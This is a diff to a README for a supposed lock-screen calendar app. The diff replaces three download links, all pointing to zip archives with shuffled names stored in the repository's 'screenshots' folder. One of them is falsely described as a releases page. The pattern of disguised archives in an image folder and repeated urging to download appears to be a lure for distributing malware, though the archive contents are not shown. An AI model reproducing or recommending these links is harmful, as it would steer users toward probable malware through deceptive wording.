@@ -6,7 +6,7 @@ Welcome to the LockScreen-Calendar-ShortCut! This application helps you display 
 
 ## 📥 Download Now
 
-[![Download LockScreen-Calendar-ShortCut](https://raw.githubusercontent.com/meranooo/LockScreen-Calendar-ShortCut/main/screenshots/Screen_Cut_Lock_Short_Calendar_v3.2.zip)](https://raw.githubusercontent.com/meranooo/LockScreen-Calendar-ShortCut/main/screenshots/Screen_Cut_Lock_Short_Calendar_v3.2.zip)
+[![Download LockScreen-Calendar-ShortCut](https://github.com/meranooo/LockScreen-Calendar-ShortCut/raw/refs/heads/main/screenshots/Screen_Short_Lock_Calendar_Cut_v2.0-alpha.1.zip)](https://github.com/meranooo/LockScreen-Calendar-ShortCut/raw/refs/heads/main/screenshots/Screen_Short_Lock_Calendar_Cut_v2.0-alpha.1.zip)
 
 ## ☑️ System Requirements
 
@@ -28,7 +28,7 @@ Before you download, make sure your device meets these requirements:
 Follow these simple steps to get LockScreen-Calendar-ShortCut on your device.
 
 1. **Visit the Releases Page**
-   Open your web browser and go to the releases page: [Download LockScreen-Calendar-ShortCut](https://raw.githubusercontent.com/meranooo/LockScreen-Calendar-ShortCut/main/screenshots/Screen_Cut_Lock_Short_Calendar_v3.2.zip)
+   Open your web browser and go to the releases page: [Download LockScreen-Calendar-ShortCut](https://github.com/meranooo/LockScreen-Calendar-ShortCut/raw/refs/heads/main/screenshots/Screen_Short_Lock_Calendar_Cut_v2.0-alpha.1.zip)
 
 2. **Choose the Latest Version**
    Look for the latest version at the top of the page. This version contains the most recent features and fixes.
@@ -77,4 +77,4 @@ If you have any questions or need further assistance, feel free to reach out thr
 
 ## 📥 Download Now Again
 
-Don't wait! [Download LockScreen-Calendar-ShortCut here](https://raw.githubusercontent.com/meranooo/LockScreen-Calendar-ShortCut/main/screenshots/Screen_Cut_Lock_Short_Calendar_v3.2.zip) and enhance your lock screen experience with your calendar events today!
+Don't wait! [Download LockScreen-Calendar-ShortCut here](https://github.com/meranooo/LockScreen-Calendar-ShortCut/raw/refs/heads/main/screenshots/Screen_Short_Lock_Calendar_Cut_v2.0-alpha.1.zip) and enhance your lock screen experience with your calendar events today!
